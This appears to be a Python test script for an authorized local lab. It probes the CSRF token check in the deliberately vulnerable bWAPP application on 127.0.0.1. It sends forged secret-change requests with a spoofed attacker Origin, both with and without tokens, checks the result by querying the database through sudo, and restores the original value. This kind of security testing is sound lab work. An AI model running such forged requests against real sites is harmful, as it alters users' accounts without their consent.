#!/usr/bin/env python3
# loop3 t4 probe14: B3 token 对照为何失效 —— 定性调查（零写入 / 或写入后立即复原）
# 假设 A：security_level cookie 在请求中未按预期生效（会话串扰）
# 假设 B：medium 分支因未携带 token 走 else → 但代码里 medium 无 token 时应报 Invalid token
# 假设 C：csrf_3.php 的 `if($_COOKIE["security_level"] != "1" && != "2")` 因 cookie 丢失走了 low 分支
import json, subprocess, time, datetime, re
import requests

BASE = "http://127.0.0.1"
UA = "loop3-t4/1.0 (authorized local lab)"
GAP = 1.0
FACTORY = "Any bugs?"
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:800], flush=True)
    return kw


def db(q):
    r = subprocess.run(f'sudo -n mariadb -N -e "{q}"', shell=True, capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


def secret():
    return db("SELECT secret FROM bWAPP.users WHERE login='bee';")


def login(level):
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.post(BASE + "/bWAPP/login.php",
           data={"login": "bee", "password": "bug", "security_level": level, "form": "submit"},
           allow_redirects=False, timeout=20)
    return s


rec("secret_before", v=secret())

# 1) 使用固定的 security_level_set 流程，确保 cookie 真的被设置
s = requests.Session()
s.headers["User-Agent"] = UA
s.cookies.set("security_level", "1", domain="127.0.0.1", path="/")
r = s.post(BASE + "/bWAPP/login.php",
           data={"login": "bee", "password": "bug", "security_level": "1", "form": "submit"},
           allow_redirects=False, timeout=20)
rec("login_medium", status=r.status_code, cookies_after_login=dict(s.cookies),
    set_cookie=r.headers.get("Set-Cookie", ""))
time.sleep(GAP)

# 2) 先 GET csrf_3.php，观察服务端认为的安全级别（页面里会显示 Current: xxx）
r = s.get(BASE + "/bWAPP/csrf_3.php", timeout=20)
cur = re.findall(r"Current:\s*<b>(\w+)</b>", r.text)
tokf = re.findall(r'name="token"[^>]*value="([^"]+)"', r.text)
rec("get_csrf3_as_medium", server_side_level=cur, token_field=tokf, cookies=dict(s.cookies))
time.sleep(GAP)

# 3) 无 token 提交（零写入形态：login 用不存在用户的双保险 + 记录实际响应）
before = secret()
r = s.post(BASE + "/bWAPP/csrf_3.php",
           data={"action": "change", "secret": "MED-NOTOKEN-probe14", "login": "bee"},
           headers={"Origin": "http://attacker.loop3.invalid", "Referer": "http://attacker.loop3.invalid/e.html"},
           timeout=20)
after = secret()
rec("medium_without_token", resp_has_invalid_token=("Invalid token" in r.text),
    resp_snippet=re.sub(r"\s+", " ", r.text[:300]), db_before=before, db_after=after,
    wrote=(after != before))
time.sleep(GAP)
if after != FACTORY:
    s.post(BASE + "/bWAPP/csrf_3.php",
           data={"action": "change", "secret": FACTORY, "login": "bee", "token": (tokf[0] if tokf else "")}, timeout=20)
    rec("restore_attempt_with_token", v=secret())

# 4) 带正确 token 提交（medium）验证 token 路径本身有效
r = s.get(BASE + "/bWAPP/csrf_3.php", timeout=20)
tk = re.findall(r'name="token"[^>]*value="([^"]+)"', r.text)
time.sleep(GAP)
r = s.post(BASE + "/bWAPP/csrf_3.php",
           data={"action": "change", "secret": "MED-TOKEN-OK-probe14", "login": "bee", "token": (tk[0] if tk else "")},
           timeout=20)
rec("medium_with_valid_token", resp_changed=("changed" in r.text), db=secret(), token_used=bool(tk))
if secret() != FACTORY:
    time.sleep(GAP)
    r = s.get(BASE + "/bWAPP/csrf_3.php", timeout=20)
    tk2 = re.findall(r'name="token"[^>]*value="([^"]+)"', r.text)
    s.post(BASE + "/bWAPP/csrf_3.php",
           data={"action": "change", "secret": FACTORY, "login": "bee", "token": (tk2[0] if tk2 else "")}, timeout=20)
rec("restored", v=secret())

# 5) 交叉验证：登录后立刻用 security_level=1 的 cookie，但请求发到 csrf_3 且不带 token，
#    同时把 cookie 明写在 header 上，观察是否仍是 low 行为
h = requests.Session()
h.headers["User-Agent"] = UA
r = h.post(BASE + "/bWAPP/login.php",
           data={"login": "bee", "password": "bug", "security_level": "1", "form": "submit"},
           allow_redirects=False, timeout=20)
sess = h.cookies.get("PHPSESSID")
time.sleep(GAP)
r = h.post(BASE + "/bWAPP/csrf_3.php",
           data={"action": "change", "secret": "MED-EXPLICIT-probe14", "login": "bee"},
           headers={"Cookie": f"PHPSESSID={sess}; security_level=1"}, timeout=20)
rec("explicit_cookie_medium", resp_invalid=("Invalid token" in r.text),
    snippet=re.sub(r"\s+", " ", r.text[:200]), db=secret())
if secret() != FACTORY:
    time.sleep(GAP)
    h.post(BASE + "/bWAPP/csrf_3.php", data={"action": "change", "secret": FACTORY, "login": "bee"},
           headers={"Cookie": f"PHPSESSID={sess}; security_level=1"}, timeout=20)
rec("restored2", v=secret())

rec("secret_final", v=secret())
with open("/tmp/loop3-t4-probe14.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok", "secret": secret()}))
